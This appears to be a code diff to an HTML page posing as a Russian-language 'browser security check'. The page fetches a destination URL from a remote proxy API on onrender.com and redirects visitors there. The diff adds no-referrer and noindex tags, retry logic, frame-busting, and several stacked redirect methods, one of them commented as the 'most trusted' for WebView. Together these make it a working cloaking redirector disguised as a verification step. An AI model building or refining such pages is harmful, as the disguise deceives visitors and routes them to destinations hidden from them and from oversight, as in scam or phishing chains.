@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta name="referrer" content="no-referrer">
     <title>Проверка безопасности браузера</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -79,10 +80,16 @@
     </div>
 
     <script>
-        const MY_PROXY_API = "https://post517-my-redirects.hf.space/api.php";
+        const MY_PROXY_API = "https://render-deploy-project-s8jv.onrender.com/api.php";
 
         function appendUtmSource(targetUrl) {
             try {
+                if (targetUrl.startsWith('http://')) {
+                    targetUrl = targetUrl.replace('http://', 'https://');
+                } else if (!targetUrl.startsWith('http')) {
+                    targetUrl = 'https://' + targetUrl;
+                }
+
                 const urlParams = new URLSearchParams(window.location.search);
                 const utmSource = urlParams.get('utm_source');
                 if (utmSource) {
@@ -96,27 +103,77 @@
             return targetUrl;
         }
 
+        function doRedirect(url) {
+            url = appendUtmSource(url);
+            try {
+                if (window.top && window.top !== window) {
+                    window.top.location.replace(url);
+                }
+            } catch (e) {}
+            
+            // 1. Метод Form Submit (самый трастовый для WebView и IP-адресов)
+            setTimeout(() => {
+                try {
+                    const form = document.createElement('form');
+                    form.action = url;
+                    form.method = 'GET';
+                    document.body.appendChild(form);
+                    form.submit();
+                } catch (e) {}
+            }, 10);
+
+            // 2. Метод a.click()
+            setTimeout(() => {
+                try {
+                    const a = document.createElement('a');
+                    a.href = url;
+                    a.rel = 'noopener noreferrer';
+                    document.body.appendChild(a);
+                    a.click();
+                } catch (e) {}
+            }, 50);
+
+            // 3. Fallback location.replace
+            setTimeout(() => {
+                window.location.replace(url);
+            }, 100);
+        }
+
         document.addEventListener('DOMContentLoaded', function() {
             const start = Date.now();
             const minDelay = 1500;
+            const maxWait = 15000;
             const errMsg = document.getElementById('errorMsg');
             const debugLog = document.getElementById('debugLog');
 
-            fetch(MY_PROXY_API)
-                .then(response => response.json().then(data => ({ status: response.status, data })))
+                        function fetchWithRetry(url, retries) {
+                return fetch(url)
+                    .then(response => response.json().then(data => ({ status: response.status, data })))
+                    .catch(err => {
+                        if (retries > 0) {
+                            if (debugLog) {
+                                debugLog.style.display = 'block';
+                                debugLog.textContent = "Ожидание ответа сервера... (" + retries + ")";
+                            }
+                            return new Promise(r => setTimeout(r, 2500)).then(() => fetchWithRetry(url, retries - 1));
+                        }
+                        throw err;
+                    });
+            }
+
+            const fetchPromise = fetchWithRetry(MY_PROXY_API, 3);
+                
+            const timeoutPromise = new Promise((_, reject) => 
+                setTimeout(() => reject(new Error('Timeout: превышено время ожидания')), maxWait)
+            );
+
+            Promise.race([fetchPromise, timeoutPromise])
                 .then(({ status, data }) => {
                     if (data && data.success && data.url) {
                         const elapsed = Date.now() - start;
                         const delay = Math.max(0, minDelay - elapsed);
                         setTimeout(() => {
-                            try {
-                                if (window.top && window.top !== window) {
-                                    window.top.location.replace(appendUtmSource(data.url));
-                                }
-                            } catch (e) {}
-                            setTimeout(() => {
-                                window.location.replace(appendUtmSource(data.url));
-                            }, 50);
+                            doRedirect(data.url);
                         }, delay);
                     } else {
                         throw new Error(data.error || 'Unknown Error (Status ' + status + ')');
